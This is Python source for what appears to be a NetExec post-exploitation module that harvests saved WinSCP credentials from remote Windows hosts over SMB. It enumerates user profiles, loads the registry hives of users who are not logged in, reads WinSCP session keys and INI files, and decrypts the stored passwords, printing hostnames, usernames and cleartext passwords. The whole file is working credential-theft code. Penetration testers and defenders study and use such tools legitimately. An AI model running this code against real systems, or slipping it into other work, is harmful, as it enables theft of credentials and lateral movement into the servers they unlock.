# If you are looking for a local Version, the baseline code is from https://github.com/NeffIsBack/WinSCPPasswdExtractor
# References and inspiration:
# - https://github.com/anoopengineer/winscppasswd
# - https://github.com/dzxs/winscppassword
# - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb

import traceback
from typing import Tuple
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from urllib.parse import unquote
from io import BytesIO
import re
import configparser


class NXCModule:
    """Module by @NeffIsBack"""

    name = "winscp"
    description = "Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
        PATH        Specify the Path if you already found a WinSCP.ini file. (Example: PATH="C:\\Users\\USERNAME\\Documents\\WinSCP_Passwords\\WinSCP.ini")

        REQUIRES ADMIN PRIVILEGES:
        As Default the script looks into the registry and searches for WinSCP.ini files in
            \"C:\\Users\\{USERNAME}\\Documents\\WinSCP.ini\" and in
            \"C:\\Users\\{USERNAME}\\AppData\\Roaming\\WinSCP.ini\",
            for every user found on the System.
        """
        self.filepath = module_options.get("PATH", "")

        self.PW_MAGIC = 0xA3
        self.PW_FLAG = 0xFF
        self.share = "C$"
        self.userDict = {}

    # ==================== Helper ====================
    def print_creds(self, context, session):
        if isinstance(session, str):
            context.log.fail(session)
        else:
            context.log.highlight(f"======={session[0]}=======")
            context.log.highlight(f"HostName: {session[1]}")
            context.log.highlight(f"UserName: {session[2]}")
            context.log.highlight(f"Password: {session[3]}")

    def user_object_to_name_mapper(self, context, connection, all_user_objects):
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]

            for user_object in all_user_objects:
                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]

                user_profile_path = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
                self.userDict[user_object] = user_profile_path.split("\\")[-1]
        finally:
            remote_ops.finish()

    # ==================== Decrypt Password ====================
    def decrypt_passwd(self, host: str, username: str, password: str) -> str:
        key = username + host

        # transform password to bytes
        pass_bytes = []
        for i in range(len(password)):
            val = int(password[i], 16)
            pass_bytes.append(val)

        pw_flag, pass_bytes = self.dec_next_char(pass_bytes)
        pw_length = 0

        # extract password length and trim the passbytes
        if pw_flag == self.PW_FLAG:
            _, pass_bytes = self.dec_next_char(pass_bytes)
            pw_length, pass_bytes = self.dec_next_char(pass_bytes)
        else:
            pw_length = pw_flag
        to_be_deleted, pass_bytes = self.dec_next_char(pass_bytes)
        pass_bytes = pass_bytes[to_be_deleted * 2:]

        # decrypt the password
        clearpass = ""
        for _i in range(pw_length):
            val, pass_bytes = self.dec_next_char(pass_bytes)
            clearpass += chr(val)
        if pw_flag == self.PW_FLAG:
            clearpass = clearpass[len(key):]
        return clearpass

    def dec_next_char(self, pass_bytes) -> "Tuple[int, bytes]":
        """
        Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.

        Parameters
        ----------
        pass_bytes : bytes
            The password bytes
        """
        if not pass_bytes:
            return 0, pass_bytes
        a = pass_bytes[0]
        b = pass_bytes[1]
        pass_bytes = pass_bytes[2:]
        return ~(((a << 4) + b) ^ self.PW_MAGIC) & 0xFF, pass_bytes

    # ==================== Handle Registry ====================
    def registry_session_extractor(self, context, connection, user_object, sessionName):
        """Extract Session information from registry"""
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{sessionName}")["phkResult"]
            host_name = unquote(rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0])
            user_name = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UserName")[1].split("\x00")[:-1][0]
            try:
                password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "Password")[1].split("\x00")[:-1][0]
            except Exception:
                context.log.debug("Session found but no Password is stored!")
                password = ""

            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)

            dec_password = self.decrypt_passwd(host_name, user_name, password) if password else "NO_PASSWORD_FOUND"
            section_name = unquote(sessionName)
            return [section_name, host_name, user_name, dec_password]
        except Exception as e:
            context.log.fail(f"Error in Session Extraction: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()
        return "ERROR IN SESSION EXTRACTION"

    def find_all_logged_in_users_in_registry(self, context, connection):
        """Checks whether User already exist in registry and therefore are logged in"""
        user_objects = []

        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            # Enumerate all logged in and loaded Users on System
            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "")["phkResult"]
            users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]

            # Get User Names
            user_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)

            # Filter legit users in regex
            user_names.remove(".DEFAULT")
            regex = re.compile(r"^.*_Classes$")
            user_objects = [i for i in user_names if not regex.match(i)]
        except Exception as e:
            context.log.fail(f"Error handling Users in registry: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()
        return user_objects

    def find_all_users(self, context, connection):
        """Find all User on the System in HKEY_LOCAL_MACHINE"""
        user_objects = []

        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            # Enumerate all Users on System
            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")["phkResult"]
            users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]

            # Get User Names
            user_objects = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
        except Exception as e:
            context.log.fail(f"Error handling Users in registry: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()
        return user_objects

    def load_missing_users(self, context, connection, unloaded_user_objects):
        """Extract Information for not logged in Users and then loads them into registry."""
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            for user_object in unloaded_user_objects:
                # Extract profile Path of NTUSER.DAT
                reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]
                user_profile_path = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)

                # Load Profile
                reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "")["phkResult"]

                context.log.debug(f"LOAD USER INTO REGISTRY: {user_object}")
                rrp.hBaseRegLoadKey(remote_ops._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
        finally:
            remote_ops.finish()

    def unload_missing_users(self, context, connection, unloaded_user_objects):
        """If some user were not logged in at the beginning we unload them from registry."""
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            # Unload Profile
            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "")["phkResult"]

            for user_object in unloaded_user_objects:
                context.log.debug("UNLOAD USER FROM REGISTRY: " + user_object)
                try:
                    rrp.hBaseRegUnLoadKey(remote_ops._RemoteOperations__rrp, key_handle, user_object)
                except Exception as e:
                    context.log.fail(f"Error unloading user {user_object} in registry: {e}")
                    context.log.debug(traceback.format_exc())
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
        finally:
            remote_ops.finish()

    def check_masterpassword_set(self, context, connection, user_object):
        use_master_password = False
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security")["phkResult"]
            use_master_password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseMasterPassword")[1]
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
        except DCERPCException as e:
            if str(e).find("ERROR_FILE_NOT_FOUND"):
                context.log.debug("Security configuration registry not found, no master passwords set at all.")
            else:
                context.log.exception(e)
        finally:
            remote_ops.finish()
        return use_master_password

    def registry_discover(self, context, connection):
        context.log.display("Looking for WinSCP creds in Registry...")
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            # Enumerate all Users on System
            user_objects = self.find_all_logged_in_users_in_registry(context, connection)
            all_user_objects = self.find_all_users(context, connection)
            self.user_object_to_name_mapper(context, connection, all_user_objects)

            # Users which must be loaded into registry:
            unloaded_user_objects = list(set(user_objects).symmetric_difference(set(all_user_objects)))
            self.load_missing_users(context, connection, unloaded_user_objects)

            # Retrieve how many sessions are stored in registry from each user_object
            ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            for user_object in all_user_objects:
                try:
                    key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions")["phkResult"]
                    sessions = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
                    context.log.success(f'Found {sessions - 1} sessions for user "{self.userDict[user_object]}" in registry!')

                    # Get Session Names
                    session_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(sessions)]
                    rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
                    session_names.remove("Default%20Settings")

                    if self.check_masterpassword_set(context, connection, user_object):
                        context.log.fail("MasterPassword set! Aborting extraction...")
                        continue
                    # Extract stored Session infos
                    for sessionName in session_names:
                        self.print_creds(context, self.registry_session_extractor(context, connection, user_object, sessionName))
                except DCERPCException as e:
                    if str(e).find("ERROR_FILE_NOT_FOUND"):
                        context.log.debug(f"No WinSCP config found in registry for user {user_object}")
                except Exception as e:
                    context.log.fail(f"Unexpected error: {e}")
                    context.log.debug(traceback.format_exc())
            self.unload_missing_users(context, connection, unloaded_user_objects)
        except DCERPCException as e:
            # Error during registry query
            if str(e).find("rpc_s_access_denied"):
                context.log.fail("Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry.")
        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()

    # ==================== Handle Configs ====================
    def decode_config_file(self, context, confFile):
        config = configparser.RawConfigParser(strict=False)
        config.read_string(confFile)

        # Stop extracting creds if Master Password is set
        if int(config.get("Configuration\\Security", "UseMasterPassword")) == 1:
            context.log.fail("Master Password Set, unable to recover saved passwords!")
            return

        for section in config.sections():
            if config.has_option(section, "HostName"):
                host_name = unquote(config.get(section, "HostName"))
                user_name = config.get(section, "UserName")
                if config.has_option(section, "Password"):
                    enc_password = config.get(section, "Password")
                    dec_password = self.decrypt_passwd(host_name, user_name, enc_password)
                else:
                    dec_password = "NO_PASSWORD_FOUND"
                section_name = unquote(section)
                self.print_creds(context, [section_name, host_name, user_name, dec_password])

    def get_config_file(self, context, connection):
        if self.filepath:
            self.share = self.filepath.split(":")[0] + "$"
            path = self.filepath.split(":")[1]

            try:
                buf = BytesIO()
                connection.conn.getFile(self.share, path, buf.write)
                conf_file = buf.getvalue().decode()
                context.log.success("Found config file! Extracting credentials...")
                self.decode_config_file(context, conf_file)
            except Exception as e:
                context.log.fail(f"Error! No config file found at {self.filepath}: {e}")
                context.log.debug(traceback.format_exc())
        else:
            context.log.display("Looking for WinSCP creds in User documents and AppData...")
            output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
            users = [row.strip() for row in output.split("\r\n")[2:]]

            # Iterate over found users and default paths to look for WinSCP.ini files
            for user in users:
                paths = [
                    ("\\Users\\" + user + "\\Documents\\WinSCP.ini"),
                    ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini"),
                ]
                for path in paths:
                    conf_file = ""
                    try:
                        buf = BytesIO()
                        connection.conn.getFile(self.share, path, buf.write)
                        conf_file = buf.getvalue().decode()
                        context.log.success(f"Found config file at '{self.share + path}'! Extracting credentials...")
                    except Exception as e:
                        context.log.debug(f"No config file found at '{self.share + path}': {e}")
                    if conf_file:
                        self.decode_config_file(context, conf_file)

    def on_admin_login(self, context, connection):
        if not self.filepath:
            self.registry_discover(context, connection)
        self.get_config_file(context, connection)
